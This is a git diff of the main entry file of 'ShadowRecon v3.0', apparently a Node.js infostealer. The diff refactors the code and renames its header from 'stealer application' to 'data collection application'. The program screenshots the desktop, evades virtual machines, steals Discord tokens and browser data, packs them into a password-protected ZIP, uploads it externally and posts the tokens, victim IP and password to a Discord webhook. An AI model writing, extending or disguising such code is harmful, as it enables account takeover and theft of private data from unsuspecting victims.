@@ -1,6 +1,6 @@
 /**
  * Main Application Entry Point
- * Clean, modular, and efficient stealer application
+ * Clean, modular, and efficient data collection application
  */
 
 const { logger } = require('./core/logger');
@@ -8,10 +8,7 @@ const { ErrorHandler } = require('./core/errors');
 const config = require('./config/config');
 const { fileManager } = require('./core/fileManager');
 const { stats } = require('./core/statistics');
-const { BrowserCollector } = require('./modules/browsers/collector');
-const { DiscordService } = require('./services/discord/service');
-const { uploadService } = require('./services/upload/service');
-const { ScreenshotCapture } = require('./modules/screenshot/capture');
+const { serviceManager } = require('./core/serviceManager');
 const CoreUtils = require('./core/utils');
 
 class Application {
@@ -19,11 +16,6 @@ class Application {
         this.initialized = false;
         this.results = {};
         this.screenshotPath = null;
-        
-        // Initialize services
-        this.browserCollector = new BrowserCollector();
-        this.discordService = new DiscordService();
-        this.screenshotCapture = new ScreenshotCapture();
         
         // Setup error handlers
         ErrorHandler.setupGlobalHandlers();
@@ -41,8 +33,8 @@ class Application {
                 throw new Error('Invalid configuration');
             }
 
-            // Note: File manager initialization moved to processAndSend to avoid creating 
-            // temporary folders when no Discord tokens are found
+            // Initialize service manager
+            await serviceManager.initialize();
 
             // Collect system information
             await this.collectSystemInfo();
@@ -102,18 +94,19 @@ class Application {
     }
 
     /**
-     * Capture desktop screenshot at application launch
+     * Capture desktop screenshot
      * @returns {Promise<string|null>} Path to screenshot file
      */
-    async captureInitialScreenshot() {
+    async captureScreenshot() {
         try {
-            logger.info('Capturing initial desktop screenshot');
-            this.screenshotPath = await this.screenshotCapture.captureScreenshot();
+            logger.info('Capturing desktop screenshot');
+            const screenshotService = serviceManager.getService('screenshot');
+            this.screenshotPath = await screenshotService.captureScreenshot();
             
             if (this.screenshotPath) {
-                logger.info('Initial screenshot captured successfully', { path: this.screenshotPath });
+                logger.info('Screenshot captured successfully', { path: this.screenshotPath });
             } else {
-                logger.warn('Failed to capture initial screenshot');
+                logger.warn('Failed to capture screenshot');
             }
             
             return this.screenshotPath;
@@ -140,41 +133,38 @@ class Application {
         if (modules.discord) {
             try {
                 logger.info('Collecting Discord data');
-                results.discord = await this.discordService.collectAccounts();
+                const discordService = serviceManager.getService('discord');
+                results.discord = await discordService.collectAccounts();
                 
                 // Exit early if no Discord accounts found
                 const discordAccounts = results.discord?.length || 0;
                 if (discordAccounts === 0) {
-                    logger.info('No Discord tokens found - exiting without collecting other data or creating files');
-                    return null; // Return null to indicate no data should be processed
+                    logger.info('No Discord tokens found - exiting');
+                    return null;
                 }
                 
-                logger.info(`Found ${discordAccounts} Discord accounts - proceeding with data collection`);
+                logger.info(`Found ${discordAccounts} Discord accounts - proceeding`);
             } catch (error) {
                 ErrorHandler.handle(error);
-                logger.info('Discord data collection failed - exiting without creating files');
-                return null; // Return null to indicate no data should be processed
+                logger.info('Discord data collection failed - exiting');
+                return null;
             }
         } else {
-            logger.info('Discord module disabled - exiting without creating files');
-            return null; // If Discord module is disabled, don't create any files
+            logger.info('Discord module disabled - exiting');
+            return null;
         }
 
         // Browser data collection - only if we have Discord tokens
         if (modules.browsers) {
             try {
                 logger.info('Collecting browser data');
-                results.browsers = await this.browserCollector.collect();
+                const browserCollector = serviceManager.getService('browserCollector');
+                results.browsers = await browserCollector.collect();
             } catch (error) {
                 ErrorHandler.handle(error);
                 results.browsers = { error: error.message };
             }
         }
-
-        // Add other modules here as needed
-        // if (modules.crypto) { ... }
-        // if (modules.files) { ... }
-        // if (modules.system) { ... }
 
         this.results = results;
         
@@ -194,20 +184,21 @@ class Application {
         try {
             logger.info('Processing collected data');
 
-            // Initialize file manager now that we know we have Discord tokens to process
+            // Initialize file manager now that we have data to process
             fileManager.init();
 
-            // Save screenshot to the generated save folder after fileManager is initialized
-            if (this.screenshotPath && this.screenshotCapture.screenshotExists()) {
+            // Save screenshot to archive folder
+            const screenshotService = serviceManager.getService('screenshot');
+            if (this.screenshotPath && screenshotService.screenshotExists()) {
                 try {
-                    const screenshotBuffer = this.screenshotCapture.getScreenshotBuffer();
+                    const screenshotBuffer = screenshotService.getScreenshotBuffer();
                     if (screenshotBuffer) {
                         const filename = require('path').basename(this.screenshotPath);
                         fileManager.saveBuffer(screenshotBuffer, 'Screenshots', filename);
-                        logger.info('Screenshot saved to archive folder', { filename });
+                        logger.info('Screenshot saved to archive', { filename });
                     }
                 } catch (error) {
-                    logger.warn('Failed to save screenshot to archive folder', error.message);
+                    logger.warn('Failed to save screenshot to archive', error.message);
                 }
             }
 
@@ -215,21 +206,15 @@ class Application {
             const systemInfo = stats.getRawData().system;
             const userIp = systemInfo.ip || 'Unknown';
 
-            // Screenshot webhook sending disabled - screenshots are still captured and saved to archive
-            if (this.screenshotPath && this.screenshotCapture.screenshotExists()) {
-                logger.info('Screenshot captured and saved to archive (webhook sending disabled)');
-            } else {
-                logger.warn('No screenshot available');
-            }
-
-            // Generate password for ZIP file if it should be password protected
+            // Generate password for ZIP file if needed
+            const uploadService = serviceManager.getService('upload');
             let zipPassword = null;
             if (uploadService.shouldPasswordProtect(fileManager.getZipPath())) {
                 zipPassword = CoreUtils.generatePassword(16);
                 logger.info('Generated password for ZIP file protection');
             }
 
-            // Create archive (with password if needed)
+            // Create archive
             const zipPath = await fileManager.createZip(zipPassword);
             const zipSizeMB = fileManager.getZipSizeMB();
 
@@ -239,40 +224,34 @@ class Application {
                 passwordProtected: !!zipPassword
             });
 
-            // Determine if file should be uploaded
+            // Upload file if needed
             let uploadResult = null;
             if (uploadService.shouldUpload(zipPath)) {
-                logger.info('File should be uploaded to external service', {
-                    reason: zipPath.toLowerCase().includes('save-') ? 'save-* file pattern' : 'size exceeds limit'
-                });
+                logger.info('Uploading file to external service');
                 
                 const metadata = zipPassword ? { password: zipPassword } : {};
                 try {
                     uploadResult = await uploadService.upload(zipPath, null, metadata);
                     if (uploadResult) {
                         logger.info('File uploaded successfully');
-                    } else {
-                        logger.warn('Upload failed or disabled - continuing with local file only');
                     }
                 } catch (error) {
-                    logger.warn('Upload service failed - continuing without upload', {
-                        error: error.message
-                    });
-                    uploadResult = null;
+                    logger.warn('Upload failed - continuing with local file', error.message);
                 }
             }
 
-            // SECOND: Send Discord accounts if available (as per requirement: after screenshot)
+            // Send Discord account embeds
             if (this.results.discord && Array.isArray(this.results.discord) && this.results.discord.length > 0) {
-                await this.discordService.sendAccountEmbeds(this.results.discord, userIp, uploadResult, zipPath, zipPassword);
-                logger.info('Sent Discord account embeds (after screenshot)');
+                const discordService = serviceManager.getService('discord');
+                await discordService.sendAccountEmbeds(this.results.discord, userIp, uploadResult, zipPath, zipPassword);
+                logger.info('Sent Discord account embeds');
             } else {
-                // Only send main webhook if no Discord accounts are available
+                // Send main webhook if no Discord accounts available
                 await this.sendMainWebhook(uploadResult, zipPath, zipPassword);
-                logger.info('Sent main webhook (no Discord accounts available)');
+                logger.info('Sent main webhook');
             }
 
-            logger.info('Data processing and sending completed');
+            logger.info('Data processing completed');
         } catch (error) {
             ErrorHandler.handle(error);
             throw error;
@@ -284,6 +263,7 @@ class Application {
      */
     async sendMainWebhook(uploadResult = null, zipPath = '', zipPassword = null) {
         try {
+            const discordService = serviceManager.getService('discord');
             const systemInfo = stats.getRawData().system;
             const payload = stats.buildWebhookPayload(
                 systemInfo.username,
@@ -296,43 +276,31 @@ class Application {
                 // Send with link and password if available
                 const embed = JSON.parse(payload).embeds[0];
                 
-                // Add password information to embed if present
+                // Add password information if present
                 const password = uploadResult.password || zipPassword;
                 if (password) {
-                    embed.fields = embed.fields || [];
                     embed.fields.push({
-                        name: ":key: Archive Password",
+                        name: ":key: Password",
                         value: `\`${password}\``,
-                        inline: false
-                    });
-                    embed.fields.push({
-                        name: ":warning: Important",
-                        value: "This archive is password protected. Use the password above to extract the contents.",
-                        inline: false
+                        inline: true
                     });
                 }
                 
-                await this.discordService.sendWebhook(JSON.parse(JSON.stringify({ embeds: [embed] })));
+                await discordService.sendWebhook(JSON.parse(JSON.stringify({ embeds: [embed] })));
             } else {
                 // Send with file attachment and password info if available
                 const embed = JSON.parse(payload).embeds[0];
                 
-                // Add password information to embed if present
+                // Add password information if present
                 if (zipPassword) {
-                    embed.fields = embed.fields || [];
                     embed.fields.push({
-                        name: ":key: Archive Password",
+                        name: ":key: Password",
                         value: `\`${zipPassword}\``,
-                        inline: false
-                    });
-                    embed.fields.push({
-                        name: ":warning: Important",
-                        value: "This archive is password protected. Use the password above to extract the contents.",
-                        inline: false
+                        inline: true
                     });
                 }
                 
-                await this.discordService.sendFile(zipPath, embed);
+                await discordService.sendFile(zipPath, embed);
             }
 
             logger.info('Main webhook sent successfully');
@@ -351,10 +319,8 @@ class Application {
             // Clean up temporary files
             fileManager.cleanup();
 
-            // Clean up screenshot files
-            if (this.screenshotCapture) {
-                this.screenshotCapture.cleanup();
-            }
+            // Clean up services
+            await serviceManager.cleanup();
 
             logger.info('Cleanup completed');
         } catch (error) {
@@ -369,13 +335,13 @@ class Application {
         try {
             logger.info('Starting ShadowRecon v3.0');
 
-            // FIRST: Capture screenshot immediately at launch (as per requirement)
-            await this.captureInitialScreenshot();
+            // Capture screenshot first
+            await this.captureScreenshot();
 
             // Initialize application
             await this.initialize();
 
-            // VM detection (if enabled)
+            // VM detection if enabled
             if (config.get('security.enableVmDetection')) {
                 const isVm = await CoreUtils.isVirtualMachine();
                 if (isVm) {
@@ -387,13 +353,13 @@ class Application {
             // Collect data
             const results = await this.collectData();
             
-            // Exit early if no Discord tokens were found (results will be null)
+            // Exit early if no data collected
             if (results === null) {
-                logger.info('ShadowRecon completed - no Discord tokens found, no files created');
+                logger.info('ShadowRecon completed - no data to process');
                 return;
             }
 
-            // Process and send data (screenshot will be sent first, then embeds)
+            // Process and send data
             await this.processAndSend();
 
             logger.info('ShadowRecon completed successfully');
